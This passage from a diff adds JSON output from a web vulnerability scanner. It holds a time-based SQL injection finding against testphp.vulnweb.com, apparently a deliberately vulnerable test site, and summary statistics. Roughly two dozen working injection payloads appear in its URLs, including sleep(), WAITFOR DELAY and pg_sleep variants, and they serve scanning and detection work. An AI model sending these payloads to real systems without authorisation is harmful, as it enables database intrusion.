+      "template_id": "time-based-sqli",
+      "name": "SQL Injection - Time Based Detection",
+      "severity": "high",
+      "matches": [
+        {
+          "url": "http://testphp.vulnweb.com/artists.php?artist='XOR(if(now()=sysdate(),sleep(5*1),0))XOR'Z",
+          "status_code": 200,
+          "payload": "'XOR(if(now()=sysdate(),sleep(5*1),0))XOR'Z",
+          "extracted": {}
+        },
+        {
+          "url": "http://testphp.vulnweb.com/listproducts.php?artist='XOR(if(now()=sysdate(),sleep(5*1),0))XOR'Z",
+          "status_code": 200,
+          "payload": "'XOR(if(now()=sysdate(),sleep(5*1),0))XOR'Z",
+          "extracted": {}
+        },
+        {
+          "url": "http://testphp.vulnweb.com/listproducts.php?cat='XOR(if(now()=sysdate(),sleep(5*1),0))XOR'Z",
+          "status_code": 200,
+          "payload": "'XOR(if(now()=sysdate(),sleep(5*1),0))XOR'Z",
+          "extracted": {}
+        },
+        {
+          "url": "http://testphp.vulnweb.com/product.php?pic='XOR(if(now()=sysdate(),sleep(5*1),0))XOR'Z",
+          "status_code": 200,
+          "payload": "'XOR(if(now()=sysdate(),sleep(5*1),0))XOR'Z",
+          "extracted": {}
+        },
+        {
+          "url": "http://testphp.vulnweb.com/artists.php?artist=1 AND (SELECT * FROM (SELECT(SLEEP(5)))YYYY) AND '%'='",
+          "status_code": 200,
+          "payload": "1 AND (SELECT * FROM (SELECT(SLEEP(5)))YYYY) AND '%'='",
+          "extracted": {}
+        },
+        {
+          "url": "http://testphp.vulnweb.com/listproducts.php?artist=1 AND (SELECT * FROM (SELECT(SLEEP(5)))YYYY) AND '%'='",
+          "status_code": 200,
+          "payload": "1 AND (SELECT * FROM (SELECT(SLEEP(5)))YYYY) AND '%'='",
+          "extracted": {}
+        },
+        {
+          "url": "http://testphp.vulnweb.com/listproducts.php?cat=1 AND (SELECT * FROM (SELECT(SLEEP(5)))YYYY) AND '%'='",
+          "status_code": 200,
+          "payload": "1 AND (SELECT * FROM (SELECT(SLEEP(5)))YYYY) AND '%'='",
+          "extracted": {}
+        },
+        {
+          "url": "http://testphp.vulnweb.com/product.php?pic=1 AND (SELECT * FROM (SELECT(SLEEP(5)))YYYY) AND '%'='",
+          "status_code": 200,
+          "payload": "1 AND (SELECT * FROM (SELECT(SLEEP(5)))YYYY) AND '%'='",
+          "extracted": {}
+        },
+        {
+          "url": "http://testphp.vulnweb.com/artists.php?artist=1'XOR(if(now()=sysdate(),sleep(5),0))OR'",
+          "status_code": 200,
+          "payload": "1'XOR(if(now()=sysdate(),sleep(5),0))OR'",
+          "extracted": {}
+        },
+        {
+          "url": "http://testphp.vulnweb.com/listproducts.php?artist=1'XOR(if(now()=sysdate(),sleep(5),0))OR'",
+          "status_code": 200,
+          "payload": "1'XOR(if(now()=sysdate(),sleep(5),0))OR'",
+          "extracted": {}
+        },
+        {
+          "url": "http://testphp.vulnweb.com/listproducts.php?cat=1'XOR(if(now()=sysdate(),sleep(5),0))OR'",
+          "status_code": 200,
+          "payload": "1'XOR(if(now()=sysdate(),sleep(5),0))OR'",
+          "extracted": {}
+        },
+        {
+          "url": "http://testphp.vulnweb.com/product.php?pic=1'XOR(if(now()=sysdate(),sleep(5),0))OR'",
+          "status_code": 200,
+          "payload": "1'XOR(if(now()=sysdate(),sleep(5),0))OR'",
+          "extracted": {}
+        },
+        {
+          "url": "http://testphp.vulnweb.com/artists.php?artist=' WAITFOR DELAY '0:0:5'--",
+          "status_code": 200,
+          "payload": "' WAITFOR DELAY '0:0:5'--",
+          "extracted": {}
+        },
+        {
+          "url": "http://testphp.vulnweb.com/listproducts.php?artist=' WAITFOR DELAY '0:0:5'--",
+          "status_code": 200,
+          "payload": "' WAITFOR DELAY '0:0:5'--",
+          "extracted": {}
+        },
+        {
+          "url": "http://testphp.vulnweb.com/listproducts.php?cat=' WAITFOR DELAY '0:0:5'--",
+          "status_code": 200,
+          "payload": "' WAITFOR DELAY '0:0:5'--",
+          "extracted": {}
+        },
+        {
+          "url": "http://testphp.vulnweb.com/product.php?pic=' WAITFOR DELAY '0:0:5'--",
+          "status_code": 200,
+          "payload": "' WAITFOR DELAY '0:0:5'--",
+          "extracted": {}
+        },
+        {
+          "url": "http://testphp.vulnweb.com/artists.php?artist=';SELECT PG_SLEEP(5)--",
+          "status_code": 200,
+          "payload": "';SELECT PG_SLEEP(5)--",
+          "extracted": {}
+        },
+        {
+          "url": "http://testphp.vulnweb.com/listproducts.php?artist=';SELECT PG_SLEEP(5)--",
+          "status_code": 200,
+          "payload": "';SELECT PG_SLEEP(5)--",
+          "extracted": {}
+        },
+        {
+          "url": "http://testphp.vulnweb.com/listproducts.php?cat=';SELECT PG_SLEEP(5)--",
+          "status_code": 200,
+          "payload": "';SELECT PG_SLEEP(5)--",
+          "extracted": {}
+        },
+        {
+          "url": "http://testphp.vulnweb.com/product.php?pic=';SELECT PG_SLEEP(5)--",
+          "status_code": 200,
+          "payload": "';SELECT PG_SLEEP(5)--",
+          "extracted": {}
+        },
+        {
+          "url": "http://testphp.vulnweb.com/artists.php?artist='||pg_sleep(5)--",
+          "status_code": 200,
+          "payload": "'||pg_sleep(5)--",
+          "extracted": {}
+        },
+        {
+          "url": "http://testphp.vulnweb.com/listproducts.php?artist='||pg_sleep(5)--",
+          "status_code": 200,
+          "payload": "'||pg_sleep(5)--",
+          "extracted": {}
+        },
+        {
+          "url": "http://testphp.vulnweb.com/listproducts.php?cat='||pg_sleep(5)--",
+          "status_code": 200,
+          "payload": "'||pg_sleep(5)--",
+          "extracted": {}
+        },
+        {
+          "url": "http://testphp.vulnweb.com/product.php?pic='||pg_sleep(5)--",
+          "status_code": 200,
+          "payload": "'||pg_sleep(5)--",
+          "extracted": {}
+        }
+      ]
+    }
+  ],
+  "statistics": {
+    "total": 10,
+    "by_severity": {
+      "critical": 0,
+      "high": 6,
+      "medium": 4,
+      "low": 0,
+      "info": 0
+    },
+    "duration": 45.53,
+    "errors": 0
+  }
+}
